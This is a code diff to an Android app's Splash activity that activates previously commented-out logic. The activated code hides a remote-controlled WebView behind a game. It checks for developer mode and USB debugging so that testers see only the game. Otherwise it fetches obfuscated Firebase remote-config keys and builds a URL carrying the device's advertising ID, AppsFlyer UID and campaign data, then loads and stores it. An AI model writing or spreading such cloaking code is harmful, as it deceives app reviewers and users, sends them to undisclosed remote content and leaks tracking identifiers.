@@ -2,23 +2,26 @@ package com.prog.zka.mac
 
 import android.content.Context
 import android.content.pm.ActivityInfo
-import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import androidx.annotation.IdRes
-import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import androidx.navigation.NavController
 import androidx.navigation.findNavController
+import com.appsflyer.AppsFlyerLib
+import com.google.android.gms.ads.identifier.AdvertisingIdClient
+import com.google.firebase.ktx.Firebase
+import com.google.firebase.remoteconfig.ktx.remoteConfig
+import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
 import com.prog.zka.mac.databinding.ActivityMainBinding
-import com.prog.zka.mac.util.Lottie
-import com.prog.zka.mac.util.cancelCoroutinesAll
-import com.prog.zka.mac.util.log
+import com.prog.zka.mac.util.*
+import com.prog.zka.mac.util.manager.DataStoreManager
 import com.prog.zka.mac.util.network.internetConnection
 import kotlinx.coroutines.*
 import kotlinx.coroutines.channels.BufferOverflow
 import kotlinx.coroutines.flow.MutableSharedFlow
+import org.json.JSONObject
 import kotlin.system.exitProcess
 
 class Splash : AppCompatActivity() {
@@ -48,8 +51,7 @@ class Splash : AppCompatActivity() {
             lottie.showLoader()
             coroutine.launch(Dispatchers.IO) {
                 try {
-                    //checkDataStore()
-                    startFragmentIdFlow.emit(R.id.gameFragment)
+                    checkDataStore()
                 } catch (e: Exception) {
                     log("e: ${e.message}")
                     startFragmentIdFlow.emit(R.id.gameFragment)
@@ -115,13 +117,13 @@ class Splash : AppCompatActivity() {
     // Logic
     // ------------------------------------------------------------------------
 
-    /*
     private fun checkDataStore() {
         coroutine.launch(Dispatchers.IO) {
             when (DataStoreManager.Key.get()) {
                 "Good" -> {
                     DataStoreManager.Link.get()?.let {
                         log("DataStoreManager Key = Good | link = $it")
+                        webViewURL = it
                         startFragmentIdFlow.emit(R.id.webViewFragment)
                         lottie.hideLoader()
                     }
@@ -132,17 +134,17 @@ class Splash : AppCompatActivity() {
                 }
                 else   -> {
                     log("DataStoreManager Key = NONE")
-                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) startFragmentIdFlow.emit(R.id.gameFragment)
+                    if (isDevMode(this@Splash) && isUSB(this@Splash)) startFragmentIdFlow.emit(R.id.gameFragment)
                     else try {
                         Firebase.remoteConfig.apply {
                             setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
-                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
+                            fetchAndActivate().addOnCompleteListener(this@Splash) { task ->
                                 if (task.isSuccessful) {
-                                    val jsonStr = getString("Farrvatostreet")
+                                    val jsonStr = getString("conorgram")
                                     log("success = $jsonStr")
                                     JSONObject(jsonStr).also { jsonObj ->
                                         coroutine.launch(Dispatchers.IO) {
-                                            getCryptoFromRemote(jsonObj.getBoolean("experiment"), jsonObj.getString("tube"))
+                                            getCryptoFromRemote(jsonObj.getBoolean("flies"), jsonObj.getBoolean("mill"), jsonObj.getString("trouble"))
                                         }
                                     }
 
@@ -160,30 +162,32 @@ class Splash : AppCompatActivity() {
         }
     }
 
-    private suspend fun getCryptoFromRemote(experiment: Boolean, tube: String) {
-        if (experiment) {
-            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Good" } }
+    private suspend fun getCryptoFromRemote(flies: Boolean, mill: Boolean, trouble: String) {
+        if (flies.not()) {
             withContext(Dispatchers.Main) {
                 val completer = Completer(coroutine, 2) {
                     val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                     val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)
 
-                    val fullTube = tube + "?" +
-                            "adurti_did=${advertisingId}&" +
-                            "afy_uisd=${appsflyerUID}&" +
-                            "com_ing=${AppsflyerUtil.campaignFlow.value}&" +
-                            "dooinlk=${FacebookUtil.deeplinkFlow.value}"
+                    val fl_trbl = trouble + "?" +
+                            "adert_singid=${advertisingId}&" +
+                            "asfer_fluid=${appsflyerUID}&" +
+                            "cing_cmng=${AppsflyerUtil.campaignFlow.value}&" +
+                            "dink=${FacebookUtil.deeplinkFlow.value}"
 
-                    log("fullTube = $fullTube")
+                    log("fl_trbl = $fl_trbl")
 
-                    webViewURL = fullTube
+                    webViewURL = fl_trbl
                     startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                     lottie.hideLoader()
 
-                    coroutine.launch(Dispatchers.IO) { DataStoreManager.Link.update { fullTube } }
+                    coroutine.launch(Dispatchers.IO) {
+                        DataStoreManager.Key.update { "Good" }
+                        if (mill.toString().last().code != 123) DataStoreManager.Link.update { fl_trbl }
+                    }
                 }
 
-                AppsflyerUtil.initialize(this@MainActivity)
+                AppsflyerUtil.initialize(this@Splash)
                 coroutine.launch {
                     AppsflyerUtil.campaignFlow.collect {
                         log("campaignFlow = $it")
@@ -203,22 +207,10 @@ class Splash : AppCompatActivity() {
             withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
             startFragmentIdFlow.emit(R.id.gameFragment)
         }
-    }*/
+    }
 
-    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN)
     fun isDevMode(context: Context): Boolean {
-        return when {
-            Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN  -> {
-                Settings.Secure.getInt(context.contentResolver,
-                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
-            }
-            Build.VERSION.SDK_INT == Build.VERSION_CODES.JELLY_BEAN -> {
-                @Suppress("DEPRECATION")
-                Settings.Secure.getInt(context.contentResolver,
-                    Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
-            }
-            else                                                    -> false
-        }
+        return Settings.Secure.getInt(context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
     }
 
     fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0
